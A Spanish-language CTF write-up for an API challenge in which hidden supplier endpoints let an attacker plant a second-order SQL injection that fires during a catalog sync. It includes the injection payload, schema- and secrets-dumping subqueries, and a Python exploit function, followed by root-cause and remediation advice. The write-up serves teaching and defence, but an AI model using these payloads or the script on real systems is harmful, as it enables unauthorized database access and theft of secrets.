# Write-up — Supply Chain Reaction

| | |
|---|---|
| **CTF** | FluidAttacks CTF 2026 |
| **Categoría** | API |
| **Dificultad** | Medium |
| **Puntos** | 350 |
| **Flag** | `flag{bc9ec934c78a6c6b}` |
| **Vulnerabilidad** | SQL Injection de 2º orden en el `sync` (INSERT no parametrizado sobre datos de un "supplier" no confiable) |

---

## 1. Enunciado

> A product catalog API pulls in data from its **trusted supplier partners**.
> Trusted. Partners.
>
> Not every endpoint made it into the docs.

Instancia desplegada: `https://f6679d9d242feac5.chal.ctf.ae`

Reto **black-box** (sin código fuente): una API de catálogo de productos que
"importa" datos de sus proveedores. El énfasis sarcástico en *"Trusted. Partners."*
anticipa el fallo: la API se fía de datos que en realidad controla un atacante. La
segunda frase —*"Not every endpoint made it into the docs"*— apunta a endpoints
ocultos.

---

## 2. Reconocimiento

La raíz identifica el servicio y la doc:

```http
GET /
{"service":"ProductCatalog API","version":"2.4.1","documentation":"/api/docs",...}
```
```http
GET /api/docs
```
```json
{"endpoints":[
  {"method":"GET","path":"/api/products","parameters":{"search":"..."}},
  {"method":"GET","path":"/api/products/<id>"},
  {"method":"POST","path":"/api/products/sync","description":"Trigger a sync with registered supplier feeds"}],
 "note":"Not all endpoints are documented here."}
```

El catálogo trae 5 productos con `supplier:"internal"` y `POST /api/products/sync`
responde `sync_complete`. Pero **la doc avisa que hay endpoints ocultos**, así que se
fuerza un pequeño diccionario de rutas típicas de proveedor:

```
POST /api/supplier/register   -> 200/400   ← oculto
```

```http
GET /api/supplier/register
{"description":"Register as a new supplier to submit products",
 "next_step":"After registration, use your supplier_id to submit products via /api/supplier/products",
 "required_fields":{"company_name":"...","contact_email":"..."}}
```

Se descubre así la **cadena de proveedor**:

1. `POST /api/supplier/register` → devuelve un `supplier_id`.
2. `POST /api/supplier/products` con cabecera `X-Supplier-ID: <id>` → encola un producto
   (`status: pending_sync`).
3. `POST /api/products/sync` → mueve los productos del proveedor al **catálogo público**,
   donde ya son legibles vía `GET /api/products`.

```http
POST /api/supplier/register        {"company_name":"Acme","contact_email":"a@a.com"}
→ {"supplier_id":"8d720723", ...}

POST /api/supplier/products        X-Supplier-ID: 8d720723   {"name":"Test Widget","price":9.99}
→ {"product":{"id":"...","status":"pending_sync",...}}

POST /api/products/sync
GET  /api/products?search=Widget   → {"id":6,"name":"Test Widget","price":9.99,"supplier":"8d720723"}
```

Un atacante cualquiera es, por tanto, un "trusted partner": puede inyectar datos
arbitrarios en el catálogo principal.

---

## 3. Encontrando la vulnerabilidad

Primero se descartan varios sospechosos:

- **Mass-assignment / SSTI:** enviar `supplier:"internal"`, `is_admin`, `{{7*7}}`... los
  campos extra se ignoran y `{{7*7}}` queda literal. No hay SSTI ni override en el JSON.
- **SSRF vía feed:** registrar un `feed_url` no cambia el tiempo del sync → no se descarga.
- **SQLi en `search`:** `search=%` devuelve todo (comodín `LIKE`) pero `search=' OR '1'='1`
  devuelve 0 → el SELECT de lectura está **parametrizado**.

La pista llega al fuzzear tipos en el submit:

```http
POST /api/supplier/products  {"name":[1,2],"price":1}   → 201 (¡aceptado!)
POST /api/supplier/products  {"name":"x","price":"abc"} → 400 "Price must be a number"
```

**Solo `price` valida el tipo; `name` acepta cualquier JSON.** Y al sincronizar, el
producto `name:[1,2]` aparece en el catálogo como `"[1, 2]"` — es decir, el `name` se
coacciona con `str()` de Python antes de guardarse.

El detalle decisivo: un producto con `name` tipo **dict** (p. ej.
`{"name":{"a":1},"price":1}`) **desaparece** del catálogo tras el sync. `str(dict)`
produce `{'a': 1}` → contiene **comillas simples**. Se prueba la hipótesis directa con un
nombre que lleva una comilla y un control limpio:

```http
{"name":"quote_a'b_test","price":1}    → tras sync: NO aparece  ✗
{"name":"clean_control_xyz","price":1} → tras sync: id 10       ✓
```

El nombre con `'` rompe la consulta y la fila se pierde; el limpio entra. Como el SELECT
de lectura es seguro, el fallo está en el **INSERT del `sync`**, construido por formateo
de string (no parametrizado). Es una **SQL injection de 2º orden**: se almacena vía el
subsistema de proveedor y se dispara al importar. La query aproximada:

```sql
INSERT INTO products (name, price, supplier) VALUES ('<str(name)>', <price>, '<supplier_id>')
```

---

## 4. Explotación

En SQLite, `VALUES` acepta **expresiones**, no solo literales. Inyectando en `name`:

```
name = MARKER'||(SELECT ...)||'
```

el fragmento del INSERT se convierte en:

```sql
VALUES('MARKER'||(SELECT ...)||'', <price>, '<supplier_id>')
```

de modo que el `name` insertado es `"MARKER" + resultado_subconsulta`. El producto queda
en el catálogo y se lee con `GET /api/products?search=MARKER`. Para no introducir comillas
dentro de la subconsulta (romperían la cadena) se codifican los strings como
`CAST(x'<hex>' AS TEXT)`.

**Esquema:**

```
SELECT group_concat(name,'|') FROM sqlite_master
→ products | sqlite_sequence | secrets
```

**Columnas de `secrets`** (`'secrets'` → hex para evitar comillas):

```
SELECT group_concat(name,'|') FROM pragma_table_info(CAST(x'73656372657473' AS TEXT))
→ id | key | value
```

**Volcado:**

```
SELECT group_concat(key||'='||value, '\n') FROM secrets
→ api_flag=flag{bc9ec934c78a6c6b}
```

### Script de solución (`exploit.py`)

Automatiza registro → submit del payload → sync → lectura por marcador, y admite una
subconsulta arbitraria como argumento:

```bash
$ python3 exploit.py https://f6679d9d242feac5.chal.ctf.ae
[*] tablas: products|sqlite_sequence|secrets
[*] secrets cols: id|key|value
[*] secrets dump:
api_flag=flag{bc9ec934c78a6c6b}

>>> flag{bc9ec934c78a6c6b}
```

```python
def leak(subquery):
    marker = "MK" + os.urandom(4).hex()
    sid = register()
    payload = f"{marker}'||({subquery})||'"           # 'marker'||(SELECT ...)||''
    S.post(f"{HOST}/api/supplier/products",
           headers={"X-Supplier-ID": sid}, json={"name": payload, "price": 1})
    S.post(f"{HOST}/api/products/sync")
    r = S.get(f"{HOST}/api/products", params={"search": marker})
    for p in r.json()["products"]:
        if isinstance(p["name"], str) and p["name"].startswith(marker):
            return p["name"][len(marker):]
```

---

## 5. Flag

```
flag{bc9ec934c78a6c6b}
```

---

## 6. Causa raíz y remediación

**Causa raíz:** el servicio confía en datos de un "proveedor" que en realidad puede
registrar cualquiera, y los inserta en su base de datos mediante **concatenación de
strings**. Se suma una **validación de tipos incompleta** (solo `price`) que permite
colar valores arbitrarios en `name`. El resultado es una inyección SQL de segundo orden:
la entrada maliciosa se guarda en un paso (submit) y se ejecuta en otro (sync).

**Cómo se arregla:**

- **Consultas parametrizadas siempre**, también en los INSERT del proceso de importación
  (`cursor.execute("INSERT ... VALUES (?,?,?)", (name, price, supplier))`). El SELECT ya
  lo estaba; el INSERT quedó fuera.
- **Validar el esquema de entrada** de forma estricta: `name` debe ser `str` (rechazar
  list/dict), longitud acotada, `price` numérico y en rango. Un validador (pydantic,
  marshmallow) en el borde del subsistema de proveedor.
- **Modelo de confianza cero con los partners:** que un tercero pueda registrarse y
  empujar datos al catálogo es aceptable, pero esos datos deben tratarse como no
  confiables en **todo** el pipeline (submit *y* sync), no solo en la puerta de entrada.
- **Aislar los secretos:** la flag/credenciales no deberían vivir en la misma base de
  datos alcanzable desde la ruta de importación de productos.

**Lección de CTF:** cuando una entrada pasa una validación laxa y se "guarda para después",
piensa en **inyección de 2º orden** — el sink peligroso puede estar en un proceso distinto
(un `sync`, un cron, un render de admin). La señal reveladora aquí fue que un valor con `'`
**desaparecía** en lugar de dar error: una fila que se pierde al sincronizar es un INSERT
que reventó. Y en SQLite, `'x'||(SELECT ...)||'y'` convierte cualquier inyección en un
literal de cadena en un canal de exfiltración limpio, sin necesidad de UNION ni de conocer
el número de columnas.
